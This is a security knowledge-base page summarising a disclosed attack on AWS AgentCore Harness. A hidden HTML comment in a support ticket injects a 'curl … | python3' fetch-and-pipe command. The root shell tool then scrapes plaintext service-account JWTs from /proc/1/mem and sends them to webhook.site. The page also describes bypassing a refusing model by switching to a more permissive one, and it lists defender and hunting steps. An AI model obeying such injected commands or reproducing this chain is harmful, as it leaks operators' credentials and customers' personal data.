# A vault with a heap-view: AWS AgentCore Harness's default-on root shell tool reads AgentCore Identity vault credentials as plaintext from PID 1 memory after indirect prompt injection (Unit 42, Sep 18, 2026)

## Summary

Unit 42 researcher Niv Rabin (published **September 18, 2026**) demonstrated an end-to-end credential-theft chain against **AWS AgentCore Harness** — Amazon's managed AI-agent runtime — that works **in the default configuration, with nothing misconfigured**. The harness ships two built-in tools, `shell` and `file_operations`, **enabled in every session unless the operator scopes `allowedTools`**, and the shell tool **runs as root — the same UID as PID 1, the harness runtime itself**. An attacker who lands an **indirect prompt injection** (Unit 42 used a hidden HTML comment in a support ticket telling the agent to `curl` a recon script and pipe it to `python3`) therefore gets root code execution **inside the same process space where AgentCore Identity resolves vault credentials to plaintext**. Unit 42 scanned `/proc/1/maps` + `/proc/1/mem` for JWT patterns and a downstream MCP URL, exfiltrated **a 1,034-byte Bearer JWT belonging to the operator's `mcp-service` service account** — not the end user's token — plus the MCP endpoint to a webhook.site drop, then **replayed the token from a laptop with no AWS credentials at all** to list tools, read customer PII, and create tickets. The AgentCore Identity vault encrypts at rest and in transit behind KMS and IAM; it provides **no protection in use**, because any credential the harness actually uses must exist as plaintext in the harness process's heap while the shell tool can read it. AWS's response (HackerOne report #3747844, merged with #3737800): **closed as informative on June 10, 2026** under the shared-responsibility model, citing customer-side `allowedTools` scoping and egress filtering. Unit 42's durable reads: **the shell tool is the new perimeter** (whatever it can touch, an injection can touch — the model's judgment is not a boundary); **vaults protect at rest and in transit, not in use**; and the credential that lands in the heap is the **operator's long-lived, high-privilege service account**, which the invoking user was never authorized to hold.

## Tags
- patterns
- AI agents
- agentic AI
- AWS
- Bedrock AgentCore
- AgentCore Harness
- AgentCore Identity
- credential theft
- prompt injection
- indirect prompt injection
- heap scraping
- procfs
- /proc/1/mem
- root shell
- MCP
- JWT replay
- shared responsibility
- managed agent runtime
- Unit 42
- exfiltration

## Why this matters
- **It is the out-of-the-box state, not a misconfiguration.** Unit 42 is explicit: shell + file_operations on by default, shell running as root, credential resolution in the same UID. The "secure" architecture (identity vault, ARN references, KMS, IAM-gated access) is fully deployed in their test rig — and still collapses, because the design never isolates the arbitrary-code primitive from the plaintext-credential primitive.
- **Confused-deputy math at runtime.** The invoking user is only allowed `bedrock-agentcore:InvokeHarness`. The vault credential is the **operator's service account** (`mcp-service` in the demo), wired in once at `create_harness` time and reused across every session. Injection through the lowest-privilege caller therefore escalates to the highest-privilege credential the platform holds. "Authorized to invoke is not authorized to reach" — but the harness makes them equivalent whenever the shell tool is live.
- **The AWS disposition is the uncomfortable part.** Closed as informative: AWS treats `allowedTools` scoping and egress filtering as customer-side controls. That makes this a documented-by-vendor design property every AgentCore operator must mitigate themselves, not a CVE with a patch date — the same "your problem" shape as the Anthropic GTG-50020 evaluation-sandbox key handover and the broader LiteLLM-wrapper pattern: **anything that ingests untrusted content while holding keys is the perimeter.**
- **`allowedTools` scopes at the wrong lifecycle point.** The parameter applies at **InvokeHarness** time, not CreateHarness — easy to miss, and operators who set it "once at creation" believe they've disabled tools they haven't.
- **Generalizes to every managed agent runtime.** Any harness that (a) gives the model a general-purpose shell/interpreter and (b) resolves credentials in the same process hands every prompt injection root + secrets. The fix Unit 42 prescribes for runtime builders is architectural: credentials must live where the shell cannot read them, or the shell must be sandboxed away from the resolving process.

## Mechanism (as published)

1. **Primitive**: indirect prompt injection via a hidden HTML comment in a support ticket instructs the agent to fetch a recon script and pipe it to `python3`. Direct prompting to run shell commands was refused by the aligned model; the harness lets the **model be picked per invocation**, and Unit 42 routed to "a more permissive model" that "did exactly what it was asked" — saw a tool it was allowed to call, called it. The injection line was deliberately one the next-token predictor could not garble: `curl <attacker script> | python3`.
2. **Root**: `whoami`/`id` inside the shell tool → **root**; process tree read from `/proc` (the harness doesn't ship `ps`) shows PID 1 = `python3.10 -m loopy.server` (harness runtime), and the shell tool's bash is its direct child — **same UID through the chain, every process root**.
3. **Heap view**: `/proc/1/mem` is readable (same UID). Two-step scan: `/proc/1/maps` for mapped regions, then seek+read each readable region from `/proc/1/mem`, searching for patterns.
4. **Target**: the vault stores the downstream MCP Bearer token as an ARN reference; to authenticate, **the harness resolves the ARN to a plaintext JWT at runtime inside PID 1**. The scan (`pid1_identity_recon_exfil.py`) searches for exactly two things: the JWT form of the credential, and the MCP server URL needed to replay it.
5. **Exfil + replay**: both arrive at the attacker's webhook.site page in a single HTTP POST moments after the agent summarizes the ticket. The attacker connects to the MCP server **from an arbitrary laptop with no AWS credentials**, lists tools, calls `lookup_customer` (PII: names, phone numbers, partial SSNs), creates a ticket. Decoded JWT payload claims → username `mcp-service`, the operator's service account.

## Disclosure timeline (per Unit 42)
| Date | Event |
|---|---|
| 2026-05-19 | Reported to AWS Security via HackerOne (#3747844) |
| 2026-06-08 | AWS requests reproduction / scope clarifications |
| 2026-06-10 | Merged with earlier report #3737800 (same root cause); **AWS closes as informative** under the AgentCore shared-responsibility model, citing `allowedTools` scoping and egress filtering as customer-side controls |
| 2026-09-18 | Public disclosure |

No CVE assigned as of publication. Findings shared with Cyber Threat Alliance members.

## Defender actions
- **Scope `allowedTools` at InvokeHarness time** (not CreateHarness — the parameter does not persist as a creation-time lockdown) down to what each session actually needs; sessions that don't need shell/file_operations shouldn't get them. Audit any harness deployment that never sets the parameter: it is vulnerable by default.
- **Least-privilege every AgentCore Identity vault service account** to its single downstream integration. "A leaked credential is worth what its scope buys" — the vault credential is long-lived, operator-level, and reused across all sessions.
- **Watch egress from harness containers**: any outbound endpoint not on the downstream-integration list is evidence of an active injection, not configuration drift. The exfil in the demo was a single ordinary-looking HTTPS POST.
- **Hunt shape**: `curl … | python3`-style single-line fetch-and-pipe instructions arriving through any content the agent ingests (ticket bodies, emails, web pages, tool results); child `bash`/`python3` spawned off the harness PID reading `/proc/1/mem` or `/proc/*/maps`; JWT-shaped strings leaving the container.
- **For anyone building a managed agent runtime**: treat every capability the harness hands the model as an attack-surface primitive. Either resolve credentials in a process the shell tool cannot read, or run the shell in a sandbox isolated from the resolver. Same-root arbitrary-code + in-process plaintext secrets = every prompt injection is a credential-theft attempt.

## Caveats
- Demonstrated in Unit 42's own test rig ("SupportCo" fiction) against real AgentCore services; **no in-the-wild exploitation reported**.
- AWS formally disputes severity via the shared-responsibility model — the "vulnerability" is a documented default plus a runtime-architecture property, not a bug AWS accepted. Both readings are true at their respective layers: the platform design makes the customer-side controls load-bearing in a way operators may not realize.
- The permissive-model substitution (choosing a less-aligned model per invocation to get the first shell call) is part of the demonstrated attack; a strictly aligned model refused direct instructions, but Unit 42's point stands that indirect injection with a trivially-transcribable command defeated the aligned path too.

## Related pages
- [Anthropic Threat Intelligence report, September 2026](../ops/anthropic-threat-intelligence-report-september-2026-ai-augmented-operations.md) (GTG-50020 prompt-injected an AI vendor's automated evaluation sandbox into handing over customers' production API keys — same failure shape: trusted runtime holding keys, ingesting untrusted content)
- [Unit 42 machine-speed agentic intrusion](../ops/unit42-ai-assisted-cyber-attack-machine-speed-agentic-intrusion-september-2026.md)
- [Internet-exposed unauthenticated MCP servers](internet-exposed-unauthenticated-mcp-servers.md) (the downstream MCP server class abused here)
- [Amazon Kiro 'Power Leak' prompt-injection exfiltration](amazon-kiro-powers-prompt-injection-data-exfiltration.md)
- [Agent skill marketplace poisoning](agent-skill-marketplace-poisoning.md)
- [Unit 42 NOVA frontier-AI autonomous vulnerability discovery](unit42-nova-frontier-ai-autonomous-vulnerability-discovery-august-2026.md)

## Sources
- Unit 42 (primary): [https://unit42.paloaltonetworks.com/securing-aws-agentcore-harness-credentials/](https://unit42.paloaltonetworks.com/securing-aws-agentcore-harness-credentials/) (Sep 18, 2026; Niv Rabin)
